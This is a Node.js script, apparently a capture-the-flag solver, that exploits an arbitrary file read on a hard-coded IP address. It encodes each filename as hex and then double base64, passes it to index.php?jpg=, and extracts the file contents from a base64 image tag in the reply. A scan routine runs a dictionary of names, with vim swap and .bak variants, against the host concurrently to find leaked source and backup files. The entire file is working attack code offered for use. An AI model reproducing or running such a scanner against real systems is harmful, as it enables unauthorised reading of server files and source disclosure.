const fs = require('fs')
const path = require('path')
const got = require('got')
const cheerio = require('cheerio')
const flatten = require('just-flatten-it')
const pAll = require('p-all')
const Gauge = require('gauge')

const FETCH_CONCURRENCY = 5

const base64 = {
  encode (str, encoding = 'utf8') {
    let buf = new Buffer(str, encoding)
    return buf.toString('base64')
  },
  decode (str, encoding = 'utf8') {
    let buf = new Buffer(str, 'base64')
    return buf.toString(encoding)
  }
}

function decrypt (input) {
  input = base64.decode(base64.decode(input))
  let output = ''
  for (let index = 0; index < input.length; index += 2) {
    output = output + String.fromCharCode(parseInt(input.slice(index, index + 2), 16))
  }
  return output
}

function encrypt (input) {
  let output = ''
  for (let index = 0; index < input.length; index++) {
    output = output + input.charCodeAt(index).toString(16)
  }
  return base64.encode(base64.encode(output))
}

async function fetch (filename) {
  const url = `http://117.51.150.246/index.php?jpg=${encrypt(filename)}`
  const { body } = await got(url, {
    headers: {
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
    },
    retry: 5,
  })
  const matched = body.match(/<\/title>(.*)<\/br>(.*)<\/br>/)
  const request = matched && matched[1]
  const name = matched && matched[2]
  const $ = cheerio.load(body)
  const title = $('title').text()
  const content = base64.decode($('img').attr('src').slice('data:image/gif;base64,'.length) || '')
  return {
    body,
    title,
    request,
    name,
    content,
  }
}

async function main () {
  try {
    const result = await fetch('index.php')
    console.log(JSON.stringify(result, null, 2))
    console.log(result.content)
  } catch (error) {
    console.error(`Error: ${error.message}`)
  }
}

async function scan () {
  const getFilenameFunctions = [
    (n) => `.${n}.swp`,
    (n) => `.${n}.swo`,
    // (n) => `.${n}.swn`,
    // (n) => `.${n}.swm`,
    // (n) => `.${n}.swl`,
    // (n) => `.${n}.swk`,
    // (n) => `.${n}.swj`,
    // (n) => `.${n}.swi`,
    // (n) => `.${n}.swh`,
    (n) => `${n}.bak`,
    (n) => n,
  ]
  const filenames = fs.readFileSync(path.resolve(__dirname, './dict.txt'), 'utf8')
    .replace(/\r\n/g, '\n')
    .split('\n')
    .filter(Boolean)

  const gauge = new Gauge()

  try {
    let counter = {
      all: 0,
      done: 0,
    }
    const requests = flatten(filenames.map((name) => 
      getFilenameFunctions.map((getFilename) => 
        () => fetch(getFilename(name)).then((response) => {
          gauge.show('Fetch', ++counter.done / counter.all)
          return response
        })
      )
    ))
    counter.all = requests.length
    gauge.show('Fetch')
    const results = await pAll(requests, { concurrency: FETCH_CONCURRENCY })
    const availables = results.filter(({ content }) => content)
    console.log(availables)
    } catch (error) {
      console.log(error)
      console.error(`Error: ${error.message}`)
    }
}

scan()
// main()
